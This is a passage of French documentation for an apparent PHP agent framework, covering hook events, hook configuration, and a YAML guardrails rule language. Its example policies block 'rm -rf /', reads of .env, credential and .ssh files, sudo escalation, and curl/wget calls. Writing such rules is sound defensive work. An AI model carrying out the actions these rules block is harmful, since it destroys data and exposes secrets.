| `Notification` | `Notification` | Déclenché pour les notifications générales |

#### Événements système

| Événement | Valeur | Description |
|---|---|---|
| `PreCompact` | `PreCompact` | Déclenché avant la compaction de conversation |
| `PostCompact` | `PostCompact` | Déclenché après la compaction de conversation |
| `ConfigChange` | `ConfigChange` | Déclenché quand la configuration change |

#### Événements de tâches

| Événement | Valeur | Description |
|---|---|---|
| `TaskCreated` | `TaskCreated` | Déclenché quand une tâche est créée |
| `TaskCompleted` | `TaskCompleted` | Déclenché quand une tâche se termine |

#### Événements d'équipier

| Événement | Valeur | Description |
|---|---|---|
| `TeammateIdle` | `TeammateIdle` | Déclenché quand un agent équipier devient inactif |
| `SubagentStop` | `SubagentStop` | Déclenché quand un sous-agent s'arrête |

#### Événements du système de fichiers

| Événement | Valeur | Description |
|---|---|---|
| `CwdChanged` | `CwdChanged` | Déclenché quand le répertoire courant change |
| `FileChanged` | `FileChanged` | Déclenché quand des fichiers surveillés changent |

### Configuration

#### Format JSON des paramètres

Les hooks sont configurés dans `settings.json` (niveau projet `.superagent/settings.json` ou niveau utilisateur) :

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash",
        "hooks": [
          {
            "type": "command",
            "command": "echo 'Sur le point d exécuter une commande bash'",
            "timeout": 10
          }
        ]
      },
      {
        "matcher": "Bash(git *)",
        "hooks": [
          {
            "type": "command",
            "command": "/usr/local/bin/validate-git-command.sh",
            "timeout": 30,
            "if": "tool_input.command contains 'push'"
          }
        ]
      }
    ],
    "PostToolUse": [
      {
        "matcher": "Write",
        "hooks": [
          {
            "type": "command",
            "command": "php-cs-fixer fix $TOOL_INPUT_FILE_PATH",
            "async": true
          }
        ]
      }
    ],
    "SessionStart": [
      {
        "hooks": [
          {
            "type": "command",
            "command": "echo 'Session démarrée'",
            "once": true
          }
        ]
      }
    ]
  }
}
```

#### Chargement depuis la configuration

```php
use SuperAgent\Hooks\HookRegistry;
use SuperAgent\Hooks\HookEvent;

$registry = new HookRegistry($logger);

// Charger depuis un tableau de configuration (généralement analysé depuis settings.json)
$registry->loadFromConfig($config['hooks'], 'my-plugin');
```

### Utilisation

#### Enregistrer des hooks programmatiquement

```php
use SuperAgent\Hooks\HookRegistry;
use SuperAgent\Hooks\HookEvent;
use SuperAgent\Hooks\HookMatcher;
use SuperAgent\Hooks\CommandHook;

$registry = new HookRegistry($logger);

// Enregistrer un hook de commande pour PreToolUse sur Bash
$matcher = new HookMatcher(
    matcher: 'Bash',
    hooks: [
        new CommandHook(
            command: '/usr/local/bin/validate-command.sh',
            shell: 'bash',
            timeout: 30,
        ),
    ],
    pluginName: 'security-plugin',
);

$registry->register(HookEvent::PRE_TOOL_USE, $matcher);

// Enregistrer un hook qui correspond à tous les outils (matcher null)
$globalMatcher = new HookMatcher(
    matcher: null,  // correspond à tout
    hooks: [/* ... */],
);

$registry->register(HookEvent::PRE_TOOL_USE, $globalMatcher);
```

#### Depuis un tableau de configuration

```php
// HookMatcher::fromConfig() analyse le format de settings.json
$matcher = HookMatcher::fromConfig([
    'matcher' => 'Bash(git *)',
    'hooks' => [
        [
            'type' => 'command',
            'command' => '/usr/local/bin/validate-git.sh',
            'timeout' => 30,
            'async' => false,
            'once' => false,
            'if' => 'tool_input.command contains "push"',
            'statusMessage' => 'Validation de la commande git...',
        ],
        [
            'type' => 'http',
            'url' => 'https://hooks.example.com/validate',
            'headers' => ['Authorization' => 'Bearer {{env.HOOK_TOKEN}}'],
            'allowedEnvVars' => ['HOOK_TOKEN'],
            'timeout' => 10,
        ],
    ],
], 'my-plugin');

$registry->register(HookEvent::PRE_TOOL_USE, $matcher);
```

#### Exécuter des hooks

```php
use SuperAgent\Hooks\HookInput;
use SuperAgent\Hooks\HookEvent;

// Créer une entrée pour un événement PreToolUse
$input = HookInput::preToolUse(
    sessionId: $sessionId,
    cwd: getcwd(),
    toolName: 'Bash',
    toolInput: ['command' => 'git push origin main'],
    toolUseId: 'toolu_123',
    gitRepoRoot: '/path/to/repo',
);

// Exécuter tous les hooks correspondants
$result = $registry->executeHooks(HookEvent::PRE_TOOL_USE, $input);

// Vérifier le résultat
if (!$result->continue) {
    echo "Le hook a arrêté l'exécution : {$result->stopReason}\n";
    return;
}

// Vérifier le comportement de permission
if ($result->permissionBehavior === 'deny') {
    echo "Hook refusé : {$result->permissionReason}\n";
    return;
}

if ($result->permissionBehavior === 'allow') {
    // Procéder sans invite de permission
}

if ($result->permissionBehavior === 'ask') {
    // Afficher l'invite de permission à l'utilisateur
    echo "Le hook requiert une approbation : {$result->permissionReason}\n";
}

// Appliquer les entrées modifiées
if ($result->updatedInput !== null) {
    $toolInput = array_merge($toolInput, $result->updatedInput);
}

// Injecter des messages système
if ($result->systemMessage !== null) {
    $conversation->addSystemMessage($result->systemMessage);
}
```

#### Constructeurs d'entrées pratiques

```php
// PostToolUse
$input = HookInput::postToolUse(
    sessionId: $sessionId,
    cwd: getcwd(),
    toolName: 'Write',
    toolInput: ['file_path' => 'src/App.php', 'content' => '...'],
    toolUseId: 'toolu_456',
    toolOutput: 'Fichier écrit avec succès',
);

// SessionStart
$input = HookInput::sessionStart(
    sessionId: $sessionId,
    cwd: getcwd(),
    source: 'cli',
    agentType: 'main',
    model: 'claude-sonnet-4-20250514',
);

// FileChanged
$input = HookInput::fileChanged(
    sessionId: $sessionId,
    cwd: getcwd(),
    changedFiles: ['src/App.php', 'tests/AppTest.php'],
    watchPaths: ['src/', 'tests/'],
);
```

### Flux de contrôle HookResult

`HookResult` porte des directives qui contrôlent ce qui se passe après l'exécution du hook :

#### Constructeurs statiques

```php
use SuperAgent\Hooks\HookResult;

// Continuer l'exécution normalement
$result = HookResult::continue();

// Continuer avec un message système injecté
$result = HookResult::continue(
    systemMessage: 'Rappel du hook : toujours exécuter les tests après édition',
);

// Continuer avec une entrée d'outil modifiée
$result = HookResult::continue(
    updatedInput: ['command' => 'git push --dry-run origin main'],
);

// Arrêter l'exécution
$result = HookResult::stop(
    stopReason: 'Violation de sécurité détectée',
    systemMessage: 'Le hook a bloqué cette opération',
);

// Erreur
$result = HookResult::error('Le script du hook a échoué à s\'exécuter');

// Permission : Autoriser (contourne l'invite de permission, mais PAS les règles de refus)
$result = HookResult::allow(
    updatedInput: null,
    reason: 'Pré-approuvé par le hook CI',
);

// Permission : Refuser
$result = HookResult::deny('Bloqué par la politique de sécurité');

// Permission : Demander (forcer l'invite de permission)
$result = HookResult::ask(
    reason: 'L\'accès réseau nécessite une approbation',
    updatedInput: ['command' => 'curl --max-time 10 https://api.example.com'],
);
```

#### Propriétés du résultat

| Propriété | Type | Description |
|---|---|---|
| `$continue` | `bool` | Si l'exécution doit continuer |
| `$suppressOutput` | `bool` | Si la sortie de l'outil doit être supprimée |
| `$stopReason` | `?string` | Raison de l'arrêt |
| `$systemMessage` | `?string` | Message système à injecter |
| `$updatedInput` | `?array` | Entrée d'outil modifiée (remplace l'originale) |
| `$additionalContext` | `?array` | Contexte supplémentaire à injecter |
| `$watchPaths` | `?array` | Chemins à surveiller pour les changements |
| `$errorMessage` | `?string` | Message d'erreur |
| `$permissionBehavior` | `?string` | `'allow'`, `'deny'` ou `'ask'` |
| `$permissionReason` | `?string` | Raison de la décision de permission |
| `$preventContinuation` | `bool` | Empêcher la boucle de l'agent de continuer |

#### Fusion de résultats multiples

Quand plusieurs hooks s'exécutent pour le même événement, les résultats sont fusionnés :

```php
$merged = HookResult::merge([$result1, $result2, $result3]);
```

Règles de fusion :
- Si **n'importe quel** hook dit stop, le résultat fusionné est stop
- Si **n'importe quel** hook supprime la sortie, la sortie est supprimée
- Les messages système sont concaténés avec des sauts de ligne
- Les entrées mises à jour sont fusionnées (les hooks ultérieurs écrasent les précédents)
- Le comportement de permission suit la priorité : **deny > ask > allow**
- `preventContinuation` est vrai si n'importe quel hook le définit

### Types de hooks

Les hooks sont implémentés sous forme de différents types spécifiés par `HookType` :

| Type | Valeur | Description |
|---|---|---|
| `command` | `command` | Exécuter une commande shell |
| `prompt` | `prompt` | Injecter un prompt |
| `http` | `http` | Faire une requête HTTP |
| `agent` | `agent` | Exécuter un agent |
| `callback` | `callback` | Exécuter un callback PHP |
| `function` | `function` | Exécuter une fonction PHP |

#### Configuration du hook de commande

```json
{
  "type": "command",
  "command": "/path/to/script.sh",
  "shell": "bash",
  "timeout": 30,
  "async": false,
  "asyncRewake": false,
  "once": false,
  "if": "tool_input.command contains 'deploy'",
  "statusMessage": "Validation du déploiement..."
}
```

| Champ | Type | Défaut | Description |
|---|---|---|---|
| `command` | `string` | requis | Commande shell à exécuter |
| `shell` | `string` | `"bash"` | Shell à utiliser |
| `timeout` | `int` | `30` | Timeout en secondes |
| `async` | `bool` | `false` | Exécuter en arrière-plan |
| `asyncRewake` | `bool` | `false` | Réveiller l'agent quand le hook asynchrone se termine |
| `once` | `bool` | `false` | Exécuter une seule fois par session |
| `if` | `?string` | `null` | Expression conditionnelle |
| `statusMessage` | `?string` | `null` | Message de statut à afficher |

#### Configuration du hook HTTP

```json
{
  "type": "http",
  "url": "https://hooks.example.com/validate",
  "headers": {
    "Authorization": "Bearer {{env.HOOK_TOKEN}}"
  },
  "allowedEnvVars": ["HOOK_TOKEN"],
  "timeout": 30,
  "once": false,
  "if": null,
  "statusMessage": "Appel du webhook de validation..."
}
```

### Syntaxe des matchers

Les matchers de hooks utilisent la même syntaxe que les règles de permissions :

| Modèle | Correspond à |
|---|---|
| `Bash` | Tous les appels à l'outil Bash |
| `Bash(git *)` | Les commandes Bash commençant par `git ` |
| `Bash(npm install*)` | Les commandes Bash commençant par `npm install` |
| `Read` | Tous les appels à l'outil Read |
| `Write(/etc/*)` | Les appels Write vers des chemins commençant par `/etc/` |
| `null` (pas de matcher) | Tous les appels d'outils pour cet événement |

### Pipeline de hooks d'arrêt

Le `StopHooksPipeline` est un pipeline spécialisé qui s'exécute après la réponse du modèle et avant la persistance des messages. Il s'exécute en trois phases :

1. **Hooks OnStop** -- Hooks d'arrêt standard
2. **Hooks TaskCompleted** -- Pour les agents équipiers avec des tâches en cours
3. **Hooks TeammateIdle** -- Pour les agents équipiers qui sont devenus inactifs

```php
use SuperAgent\Hooks\StopHooksPipeline;

$stopPipeline = new StopHooksPipeline($hookRegistry, $logger);

$result = $stopPipeline->execute(
    messages: $allMessages,
    assistantMessages: $thisRoundMessages,
    context: [
        'session_id' => $sessionId,
        'cwd' => getcwd(),
        'git_repo_root' => '/path/to/repo',
        'agent_id' => 'agent-1',
        'agent_type' => 'main',
        'permission_mode' => 'default',
        'is_teammate' => true,
        'teammate_name' => 'code-reviewer',
        'team_name' => 'dev-team',
        'in_progress_tasks' => [
            ['id' => 'task-1', 'subject' => 'Review PR #123'],
        ],
    ],
);

// Vérifier les résultats
if ($result->hasBlockingErrors()) {
    foreach ($result->blockingErrors as $error) {
        // Injecter comme message utilisateur
    }
}

if ($result->preventContinuation) {
    echo "Boucle d'agent arrêtée : {$result->stopReason}\n";
}

// Info de débogage
$info = $result->toArray();
echo "Hooks exécutés : {$info['hook_count']}, Durée : {$info['duration_ms']}ms\n";
```

#### StopHookResult

| Propriété | Type | Description |
|---|---|---|
| `$blockingErrors` | `string[]` | Messages d'erreur à injecter comme messages utilisateur |
| `$preventContinuation` | `bool` | Si la boucle de l'agent doit s'arrêter |
| `$stopReason` | `?string` | Raison de l'arrêt |
| `$hookCount` | `int` | Nombre de hooks exécutés |
| `$hookInfos` | `array` | Info de débogage des hooks |
| `$hookErrors` | `array` | Erreurs de hooks non bloquantes |
| `$durationMs` | `int` | Durée totale du pipeline |

### Référence API

#### `HookRegistry`

| Méthode | Description |
|---|---|
| `__construct(LoggerInterface $logger)` | Créer le registre |
| `register(HookEvent $event, HookMatcher $matcher): void` | Enregistrer un matcher de hook pour un événement |
| `executeHooks(HookEvent $event, HookInput $input): HookResult` | Exécuter tous les hooks correspondants |
| `loadFromConfig(array $config, ?string $pluginName): void` | Charger les hooks depuis la configuration des paramètres |
| `clear(): void` | Effacer tous les hooks enregistrés |
| `clearEvent(HookEvent $event): void` | Effacer les hooks pour un événement spécifique |
| `getStatistics(): array` | Obtenir les compteurs de hooks par événement, hooks asynchrones, hooks une-fois |
| `getAsyncManager(): AsyncHookManager` | Obtenir le gestionnaire de hooks asynchrones |

#### `HookInput`

| Propriété | Type | Description |
|---|---|---|
| `$hookEvent` | `HookEvent` | Le type d'événement |
| `$sessionId` | `string` | ID de session actuel |
| `$cwd` | `string` | Répertoire de travail actuel |
| `$gitRepoRoot` | `?string` | Racine du dépôt git |
| `$additionalData` | `array` | Données spécifiques à l'événement (tool_name, tool_input, etc.) |

Constructeurs statiques : `preToolUse()`, `postToolUse()`, `sessionStart()`, `fileChanged()`.

#### `HookMatcher`

| Méthode | Description |
|---|---|
| `__construct(?string $matcher, HookInterface[] $hooks, ?string $pluginName)` | Créer un matcher |
| `matches(?string $toolName, array $context): bool` | Vérifier si ce matcher s'applique |
| `getHooks(): HookInterface[]` | Obtenir les hooks enregistrés |
| `fromConfig(array $config, ?string $pluginName): self` | Analyser depuis la configuration des paramètres |

### Exemples

#### Auto-formatage à l'écriture de fichier

```json
{
  "hooks": {
    "PostToolUse": [
      {
        "matcher": "Write",
        "hooks": [
          {
            "type": "command",
            "command": "php-cs-fixer fix $TOOL_INPUT_FILE_PATH --quiet",
            "async": true,
            "statusMessage": "Auto-formatage..."
          }
        ]
      }
    ]
  }
}
```

#### Bloquer les opérations git dangereuses

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash(git push*)",
        "hooks": [
          {
            "type": "command",
            "command": "echo 'Le git push nécessite une approbation manuelle'",
            "timeout": 5
          }
        ]
      }
    ]
  }
}
```

#### Initialisation de session

```json
{
  "hooks": {
    "SessionStart": [
      {
        "hooks": [
          {
            "type": "command",
            "command": "cat .superagent/project-context.md",
            "once": true,
            "statusMessage": "Chargement du contexte du projet..."
          }
        ]
      }
    ]
  }
}
```

### Dépannage

**"Unknown hook event: X"** -- Le nom de l'événement dans votre configuration ne correspond à aucune valeur d'enum `HookEvent`. Vérifiez la casse exacte (ex. `PreToolUse`, pas `pre_tool_use`).

**Le hook ne se déclenche pas** -- Vérifiez que le modèle du matcher correspond au nom de l'outil. Un matcher `null` correspond à tout. Vérifiez `$registry->getStatistics()` pour confirmer que le hook est enregistré.

**Le hook une-fois se déclenche à nouveau** -- Le suivi `once` se réinitialise quand les hooks sont rechargés. La collection `executedHooks` est en mémoire uniquement.

**Les résultats du hook asynchrone ne sont pas visibles** -- Les hooks asynchrones retournent `HookResult::continue('Hook started in background')` immédiatement. Leurs résultats sont gérés par `AsyncHookManager` et ne bloquent pas le code appelant.

**Le comportement de permission ne prend pas effet** -- Rappelez-vous que `allow` d'un hook NE contourne PAS les règles de refus des paramètres. La priorité de fusion est : deny > ask > allow.

---

## 6. Guardrails DSL

> Définissez des politiques de sécurité composables sous forme de règles YAML déclaratives qui s'évaluent à l'exécution pour contrôler l'exécution des outils, appliquer les budgets, limiter les taux et s'intégrer au système de permissions.

### Vue d'ensemble

Le Guardrails DSL fournit un moteur de politiques basé sur des règles qui se situe entre l'invocation d'outils et le moteur de permissions. Les règles sont organisées en groupes ordonnés par priorité, chacun contenant des conditions (composables avec `all_of`/`any_of`/`not`) et des actions (`deny`, `allow`, `ask`, `warn`, `log`, `pause`, `rate_limit`, `downgrade_model`). Le moteur évalue les règles contre un snapshot `RuntimeContext` qui capture les informations d'outils, le coût de session, l'utilisation de tokens, l'état de l'agent et le timing.

Classes principales :

| Classe | Rôle |
|---|---|
| `GuardrailsConfig` | Analyse les fichiers de règles YAML, valide, trie les groupes par priorité |
| `GuardrailsEngine` | Évalue les groupes de règles contre un `RuntimeContext` |
| `GuardrailsResult` | Résultat de correspondance ; se convertit en `PermissionDecision` ou `HookResult` |
| `ConditionFactory` | Analyse les arbres de conditions YAML en objets `ConditionInterface` |
| `RuleGroup` | Groupe de règles nommé, priorisé et activable |
| `Rule` | Règle unique : condition + action + message + paramètres |
| `RuleAction` | Enum de 8 types d'actions |
| `RuntimeContext` | Snapshot immuable de tout l'état d'exécution pour l'évaluation |

### Configuration

#### Structure du fichier YAML

```yaml
version: "1.0"

defaults:
  evaluation: first_match    # first_match | all_matching
  default_action: ask        # action de repli

groups:
  security:
    priority: 100            # plus élevé = évalué en premier
    enabled: true
    description: "Règles de sécurité principales"
    rules:
      - name: block-env-access
        description: "Empêcher la lecture des fichiers .env"
        conditions:
          tool: { name: "Read" }
          tool_content: { contains: ".env" }
        action: deny
        message: "L'accès aux fichiers .env est bloqué par la politique de sécurité"

      - name: block-rm-rf
        conditions:
          tool: { name: "Bash" }
          tool_input:
            field: command
            contains: "rm -rf"
        action: deny
        message: "Les commandes destructives ne sont pas autorisées"
```

#### Chargement de la configuration

```php
use SuperAgent\Guardrails\GuardrailsConfig;
use SuperAgent\Guardrails\GuardrailsEngine;

// Fichier unique
$config = GuardrailsConfig::fromYamlFile('guardrails.yaml');

// Fichiers multiples (les fichiers suivants écrasent les groupes de même nom)
$config = GuardrailsConfig::fromYamlFiles([
    'guardrails/base.yaml',
    'guardrails/project.yaml',
]);

// Depuis un tableau
$config = GuardrailsConfig::fromArray([
    'version' => '1.0',
    'defaults' => ['evaluation' => 'first_match'],
    'groups' => [/* ... */],
]);

// Valider
$errors = $config->validate();

// Créer le moteur
$engine = new GuardrailsEngine($config);

// Rechargement à chaud
$newConfig = GuardrailsConfig::fromYamlFile('guardrails-v2.yaml');
$engine->reload($newConfig);

// Statistiques
$stats = $engine->getStatistics();
// => ['groups' => 3, 'rules' => 12, 'enabled_groups' => 3]
```

### Types de conditions

#### 7 types de conditions

##### 1. `tool` -- Correspondance du nom d'outil

Correspondre par nom d'outil (exact ou any-of) :

```yaml
conditions:
  tool: { name: "Bash" }

## Correspondre à plusieurs outils
conditions:
  tool:
    name:
      any_of: ["Bash", "Read", "Write"]
```

##### 2. `tool_content` -- Correspondance du contenu extrait

Correspond au contenu extrait (commande pour Bash, file_path pour Read/Write/Edit, etc.) :

```yaml
conditions:
  tool_content: { contains: ".git/" }
  # ou
  tool_content: { starts_with: "/etc" }
  # ou
  tool_content: { matches: "*.env*" }
```

##### 3. `tool_input` -- Correspondance d'un champ d'entrée spécifique

Correspond à un champ spécifique dans l'entrée de l'outil :

```yaml
conditions:
  tool_input:
    field: command
    contains: "sudo"

## Avec any_of imbriqué
conditions:
  tool_input:
    field: file_path
    starts_with:
      any_of: ["/etc/", "/System/", "/Windows/"]
```

##### 4. `session` -- Métriques de niveau session

Évaluer le coût de session, le budget, le temps écoulé, etc. :

```yaml
conditions:
  session:
    cost_usd: { gt: 5.00 }

conditions:
  session:
    budget_pct: { gte: 90 }

conditions:
  session:
    elapsed_ms: { gt: 300000 }
```

Champs disponibles (depuis `RuntimeContext`) : `cost_usd` (`sessionCostUsd`), `call_cost_usd` (`callCostUsd`), `budget_pct`, `continuation_count`, `elapsed_ms`, `message_count`, `context_token_count`.

##### 5. `agent` -- État de l'agent

Évaluer le nombre de tours de l'agent, le modèle, etc. :

```yaml
conditions:
  agent:
    turn_count: { gt: 40 }

conditions:
  agent:
    model: "gpt-4o"
```

Champs disponibles : `turn_count`, `max_turns`, `model` (`modelName`), `session_id`.

##### 6. `token` -- Statistiques de tokens

Évaluer l'utilisation des tokens :

```yaml
conditions:
  token:
    session_input_tokens: { gt: 100000 }
    session_total_tokens: { gt: 200000 }
```

Champs disponibles : `session_input_tokens`, `session_output_tokens`, `session_total_tokens`.

##### 7. `rate` -- Limitation de taux par fenêtre glissante

Évaluer les taux d'appels sur une fenêtre temporelle :

```yaml
conditions:
  rate:
    window_seconds: 60
    max_calls: 30
    tool: "Bash"          # optionnel : compter uniquement un outil spécifique
```

#### Opérateurs de comparaison

Toutes les conditions métriques supportent ces opérateurs :

| Opérateur | Description |
|---|---|
| `gt` | Supérieur à (numérique) |
| `gte` | Supérieur ou égal à (numérique) |
| `lt` | Inférieur à (numérique) |
| `lte` | Inférieur ou égal à (numérique) |
| `eq` | Égalité exacte |
| `contains` | Correspondance de sous-chaîne insensible à la casse (chaîne) |
| `starts_with` | Correspondance de préfixe (chaîne) |
| `matches` | Correspondance de modèle glob utilisant `fnmatch()` (chaîne) |
| `any_of` | La valeur est dans une liste |

#### Logique composable : `all_of`, `any_of`, `not`

Les conditions peuvent être composées avec des combinateurs booléens :

```yaml
## ET : toutes les conditions doivent correspondre
conditions:
  all_of:
    - tool: { name: "Bash" }
    - tool_input: { field: command, contains: "curl" }
    - session: { cost_usd: { gt: 1.0 } }

## OU : n'importe quelle condition correspond
conditions:
  any_of:
    - tool_content: { contains: ".env" }
    - tool_content: { contains: "credentials" }
    - tool_content: { contains: ".ssh/" }

## NON : inverser une condition
conditions:
  not:
    tool: { name: "Read" }

## Composition imbriquée
conditions:
  all_of:
    - tool: { name: "Bash" }
    - any_of:
        - tool_input: { field: command, starts_with: "rm" }
        - tool_input: { field: command, starts_with: "sudo" }
    - not:
        session: { cost_usd: { lt: 0.50 } }
```

Quand plusieurs clés de niveau supérieur sont présentes dans un bloc de conditions, elles sont implicitement combinées avec ET :

```yaml
## Ceci est équivalent à all_of: [tool: ..., tool_content: ...]
conditions:
  tool: { name: "Read" }
  tool_content: { contains: ".env" }
```

### Types d'actions

#### 8 types d'actions

| Action | Description | Bloque l'exécution ? | Action de permission ? |
|---|---|---|---|
| `deny` | Bloquer l'appel d'outil | Oui | Oui |
| `allow` | Autoriser explicitement l'appel d'outil | Non | Oui |
| `ask` | Demander la permission à l'utilisateur | Non (attend) | Oui |
| `warn` | Journaliser un avertissement mais continuer | Non | Non |
| `log` | Journaliser l'événement silencieusement | Non | Non |
| `pause` | Bloquer pendant une durée (nécessite le paramètre `duration_seconds`) | Oui | Non (correspond à deny) |
| `rate_limit` | Bloquer en raison du dépassement de la limite de taux | Oui | Non (correspond à deny) |
| `downgrade_model` | Basculer vers un modèle moins cher (nécessite le paramètre `target_model`) | Non | Non |

Actions avec paramètres supplémentaires :

```yaml
- name: pause-on-high-cost
  conditions:
    session: { cost_usd: { gt: 10.0 } }
  action: pause
  message: "Le coût de session a dépassé 10$. Pause pour refroidissement."
  params:
    duration_seconds: 60

- name: downgrade-on-budget
  conditions:
    session: { budget_pct: { gte: 80 } }
  action: downgrade_model
  message: "Budget proche de la limite, basculement vers un modèle moins cher"
  params:
    target_model: "claude-haiku-4-5-20251001"
```

### Modes d'évaluation

| Mode | Description |
|---|---|
| `first_match` | (Par défaut) S'arrête à la première règle correspondante dans tous les groupes |
| `all_matching` | Collecte toutes les règles correspondantes ; l'action de la première correspondance est utilisée, mais toutes les correspondances sont disponibles dans `GuardrailsResult::$allMatched` |

Les groupes sont évalués par **ordre de priorité** (priorité la plus haute en premier). Au sein d'un groupe, les règles sont évaluées dans l'ordre de déclaration.

### Intégration avec PermissionEngine

Le `GuardrailsEngine` est intégré dans `PermissionEngine` à l'étape 1.5 -- après les vérifications de permissions basées sur les règles mais avant la classification bash et les vérifications basées sur le mode :

```php
use SuperAgent\Permissions\PermissionEngine;
use SuperAgent\Guardrails\GuardrailsEngine;
use SuperAgent\Guardrails\GuardrailsConfig;

// Créer le moteur guardrails
$guardrailsConfig = GuardrailsConfig::fromYamlFile('guardrails.yaml');
$guardrailsEngine = new GuardrailsEngine($guardrailsConfig);

// Injecter dans PermissionEngine
$permissionEngine->setGuardrailsEngine($guardrailsEngine);
$permissionEngine->setRuntimeContextCollector($contextCollector);
```

`GuardrailsResult` se convertit en :

- **`PermissionDecision`** via `toPermissionDecision()` -- pour les actions `deny`, `allow`, `ask`, `pause`, `rate_limit`
- **`HookResult`** via `toHookResult()` -- pour l'intégration avec le système de hooks

Les actions non liées aux permissions (`warn`, `log`, `downgrade_model`) retournent `null` depuis `toPermissionDecision()` pour que la vérification de permission passe aux étapes suivantes.

### Référence API

#### `GuardrailsConfig`

| Méthode | Description |
|---|---|
| `fromYamlFile(string $path): self` | Charger depuis un fichier YAML |
| `fromYamlFiles(array $paths): self` | Fusionner plusieurs fichiers YAML |
| `fromArray(array $data): self` | Charger depuis un tableau |
| `validate(): string[]` | Valider et retourner les erreurs |
| `getGroups(): RuleGroup[]` | Obtenir les groupes de règles (triés par priorité desc) |
| `getEvaluationMode(): string` | `first_match` ou `all_matching` |
| `getDefaultAction(): string` | Chaîne d'action par défaut |

#### `GuardrailsEngine`

| Méthode | Description |
|---|---|
| `__construct(GuardrailsConfig $config)` | Créer le moteur depuis la configuration |
| `evaluate(RuntimeContext $context): GuardrailsResult` | Évaluer toutes les règles contre le contexte |
| `reload(GuardrailsConfig $config): void` | Rechargement à chaud de la configuration |
| `getGroups(): RuleGroup[]` | Obtenir les groupes de règles actuels |
| `getStatistics(): array` | Obtenir `{groups, rules, enabled_groups}` |

#### `GuardrailsResult`

| Propriété/Méthode | Description |
|---|---|
| `$matched: bool` | Si une règle a correspondu |
| `$action: ?RuleAction` | L'action correspondante |
| `$message: ?string` | Message lisible par un humain |
| `$matchedRule: ?Rule` | La première règle correspondante |
| `$groupName: ?string` | Le groupe qui a correspondu |
| `$params: array` | Paramètres de l'action |
| `$allMatched: Rule[]` | Toutes les règles correspondantes (en mode `all_matching`) |
| `toPermissionDecision(): ?PermissionDecision` | Convertir en décision de permission |
| `toHookResult(): HookResult` | Convertir en résultat de hook |

#### `RuntimeContext`

Toutes les propriétés sont `readonly` :

| Propriété | Type | Description |
|---|---|---|
| `$toolName` | `string` | Nom de l'outil actuel |
| `$toolInput` | `array` | Paramètres d'entrée de l'outil |
| `$toolContent` | `?string` | Contenu extrait (commande, chemin de fichier, etc.) |
| `$sessionCostUsd` | `float` | Coût total de la session |
| `$callCostUsd` | `float` | Coût de cet appel |
| `$sessionInputTokens` | `int` | Total des tokens d'entrée utilisés |
| `$sessionOutputTokens` | `int` | Total des tokens de sortie utilisés |
| `$sessionTotalTokens` | `int` | Total des tokens utilisés |
| `$budgetPct` | `float` | Pourcentage du budget consommé |
| `$continuationCount` | `int` | Nombre de continuations |
| `$turnCount` | `int` | Nombre de tours de l'agent |
| `$maxTurns` | `int` | Nombre maximum de tours autorisés |
| `$modelName` | `string` | Nom du modèle actuel |
| `$elapsedMs` | `float` | Temps écoulé de la session en ms |
| `$cwd` | `string` | Répertoire de travail |
| `$rateTracker` | `?RateTracker` | Instance partagée de suivi des taux |

### Exemples

#### Politique de sécurité complète

```yaml
version: "1.0"

defaults:
  evaluation: first_match
  default_action: ask

groups:
  critical-security:
    priority: 100
    description: "Blocages durs qui ne peuvent pas être contournés"
    rules:
      - name: block-env-files
        conditions:
          any_of:
            - tool_content: { contains: ".env" }
            - tool_content: { matches: "*credentials*" }
            - tool_content: { contains: ".ssh/" }
        action: deny
        message: "L'accès aux fichiers sensibles est bloqué"

      - name: block-destructive-bash
        conditions:
          tool: { name: "Bash" }
          tool_input:
            field: command
            contains: "rm -rf /"
        action: deny
        message: "Commande catastrophique bloquée"

      - name: block-privilege-escalation
        conditions:
          tool: { name: "Bash" }
          any_of:
            - tool_input: { field: command, starts_with: "sudo" }
            - tool_input: { field: command, starts_with: "su " }
        action: deny
        message: "L'escalade de privilèges n'est pas autorisée"

  budget-controls:
    priority: 50
    description: "Contrôles de coûts et de taux"
    rules:
      - name: warn-high-cost
        conditions:
          session: { cost_usd: { gt: 5.0 } }
        action: warn
        message: "Le coût de session a dépassé 5,00$"

      - name: downgrade-on-budget
        conditions:
          session: { budget_pct: { gte: 80 } }
        action: downgrade_model
        message: "Basculement vers un modèle moins cher pour conserver le budget"
        params:
          target_model: "claude-haiku-4-5-20251001"

      - name: rate-limit-bash
        conditions:
          tool: { name: "Bash" }
          rate:
            window_seconds: 60
            max_calls: 20
        action: rate_limit
        message: "Limite de taux d'appels Bash dépassée (20/minute)"

  safety-net:
    priority: 10
    description: "Guardrails souples qui demandent confirmation"
    rules:
      - name: ask-network-access
        conditions:
          tool: { name: "Bash" }
          any_of:
            - tool_input: { field: command, starts_with: "curl" }
            - tool_input: { field: command, starts_with: "wget" }
        action: ask
        message: "Accès réseau détecté. Autoriser cette commande ?"

      - name: ask-system-dirs
        conditions:
          tool_content:
            starts_with: "/etc"
        action: ask
        message: "Accès au répertoire système. Continuer ?"
```

### Dépannage

**"Condition config must not be empty"** -- Le bloc `conditions` d'une règle est vide ou manquant. Chaque règle doit avoir au moins une condition.

**"Unknown condition key: 'x'"** -- Le type de condition n'est pas reconnu. Clés valides : `all_of`, `any_of`, `not`, `tool`, `tool_content`, `tool_input`, `session`, `agent`, `token`, `rate`.

**"Rule 'x' uses 'downgrade_model' action but missing 'target_model' param"** -- L'action `downgrade_model` nécessite une valeur `params.target_model`.

**"Rule 'x' uses 'pause' action but missing 'duration_seconds' param"** -- L'action `pause` nécessite une valeur `params.duration_seconds`.

**"Rate condition requires 'window_seconds' and 'max_calls'"** -- Les deux champs sont obligatoires pour les conditions de limitation de taux.

**Les règles ne correspondent pas** -- Vérifiez le mode d'évaluation (`first_match` vs `all_matching`), l'ordre de priorité des groupes (les groupes de priorité plus haute sont évalués en premier), et si le groupe est `enabled: true`.

---

## 7. Validateur de Sécurité Bash

> Couche de sécurité complète qui effectue 23 vérifications d'injection et d'obfuscation sur les commandes bash avant exécution, classifie les commandes par niveau de risque et s'intègre au moteur de permissions pour auto-autoriser les commandes en lecture seule.

### Vue d'ensemble

Le système de sécurité bash se compose de deux classes :

- **`BashSecurityValidator`** -- Effectue 23 vérifications de sécurité individuelles qui détectent l'injection shell, les attaques par différentiel de parseur, les flags obfusqués, les redirections dangereuses, et plus encore. Chaque vérification a un ID numérique pour la journalisation et les diagnostics.
